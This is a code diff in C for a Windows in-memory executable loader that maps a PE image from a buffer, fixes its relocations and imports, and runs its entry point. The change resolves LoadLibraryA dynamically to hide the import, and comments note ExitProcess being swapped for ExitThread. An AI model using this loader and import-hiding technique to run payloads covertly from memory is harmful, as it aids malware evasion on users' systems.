@@ -82,23 +82,22 @@ void ldr_reloc(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader)
 			lpPtr += sizeof(base_relocation_entry);
 			block.BlockSize -= 2;
 		}
-
 	}
-
 }
 
+typedef HMODULE (WINAPI *LoadLibraryA_p)(LPCSTR strDllName);
 
 void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader)
 {
 	DWORD dwIatSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
 	DWORD dwIatAddr = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
-
+	
 	// no import directory here!
 	if (dwIatAddr == 0)
 		return;
 
 	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = CALC_OFFSET(PIMAGE_IMPORT_DESCRIPTOR, pModule, dwIatAddr);
-
+	
 	while(pImportDescriptor)
 	{
 		if (pImportDescriptor->FirstThunk == 0)
@@ -106,11 +105,14 @@ void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader)
 			pImportDescriptor = NULL;
 			continue;
 		}
-
+		
 		LPDWORD pImportLookupTable = CALC_OFFSET(LPDWORD, pModule, pImportDescriptor->FirstThunk);
-		LPCSTR lpModName = CALC_OFFSET(LPCSTR, pModule, pImportDescriptor->Name);	
-		HMODULE hMod = LoadLibraryA(lpModName);
+		LPCSTR lpModName = CALC_OFFSET(LPCSTR, pModule, pImportDescriptor->Name);
 
+		LoadLibraryA_p fpLoadLibraryA = (LoadLibraryA_p) GetProcAddress(LoadLibrary(L"kernel32"), "LoadLibraryA");
+		HMODULE hMod = fpLoadLibraryA(lpModName);
+		//HMODULE hMod = LoadLibraryA(lpModName);
+		
 		if (hMod != NULL)
 			while(*pImportLookupTable != 0x00)
 			{
@@ -119,7 +121,7 @@ void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader)
 					DWORD pOrdinalValue = *(CALC_OFFSET(LPDWORD, pImportLookupTable, 0)) & 0x0000ffff;
 					*pImportLookupTable = (DWORD) GetProcAddress(hMod, (LPCSTR) pOrdinalValue);
 					// SOSTITUISCE EXITPROCESS CON EXITTHREAD 
-					if (*pImportLookupTable == (DWORD)GetProcAddress(GetModuleHandle(L"kernel32"), "ExitProcess"))
+					if (*pImportLookupTable == (DWORD)GetProcAddress(fpLoadLibraryA("kernel32"), "ExitProcess"))
 						*pImportLookupTable = (DWORD)ExitThread;
 				}
 				else
@@ -127,19 +129,21 @@ void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader)
 					LPCSTR lpProcName = CALC_OFFSET_DISP(LPCSTR, pModule, (*pImportLookupTable), 2);	// adding two bytes
 					*pImportLookupTable = (DWORD) GetProcAddress(hMod, lpProcName);
 					// SOSTITUISCE EXITPROCESS CON EXITTHREAD
-					if (*pImportLookupTable == (DWORD)GetProcAddress(GetModuleHandle(L"kernel32"), "ExitProcess"))
+					if (*pImportLookupTable == (DWORD)GetProcAddress(fpLoadLibraryA("kernel32"), "ExitProcess"))
 						*pImportLookupTable = (DWORD)ExitThread;
 				}
 				pImportLookupTable++;		
 			}
 		pImportDescriptor++;
+		
 	}
-
+	
 }
 
 
 ULONG ldr_exportdir(HMODULE hModule)
 {
+	
 	ULONG pFunction = NULL;
 	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER) hModule;
 	PIMAGE_NT_HEADERS pImageNtHeaders = CALC_OFFSET(PIMAGE_NT_HEADERS, hModule, pImageDosHeader->e_lfanew);
@@ -171,7 +175,7 @@ ULONG ldr_exportdir(HMODULE hModule)
 
 		pFunction = ptrFunctions[i];
 	}
-
+	
 	return pFunction;
 }
 
@@ -181,7 +185,7 @@ BOOL MemoryLoader(LPBYTE lpRawBuffer)
 	DWORD header_size = 0;
 	IMAGE_DOS_HEADER dos_header;
 	IMAGE_NT_HEADERS32 pe_header;
-
+	
 	if (lpRawBuffer != NULL)
 	{
 		memcpy(&dos_header, lpRawBuffer, sizeof(dos_header));	// get DOS HEADER
@@ -250,7 +254,7 @@ BOOL MemoryLoader(LPBYTE lpRawBuffer)
 	CALC_OFFSET(LPVOID, lpAddress, pe_header.OptionalHeader.AddressOfEntryPoint);
 	MAIN ptrMain = (MAIN)CALC_OFFSET(LPVOID, lpAddress, pe_header.OptionalHeader.AddressOfEntryPoint);
 	ptrMain((HINSTANCE)lpAddress, NULL, "", 0xa);
-
+	
 	return TRUE;
 }
 
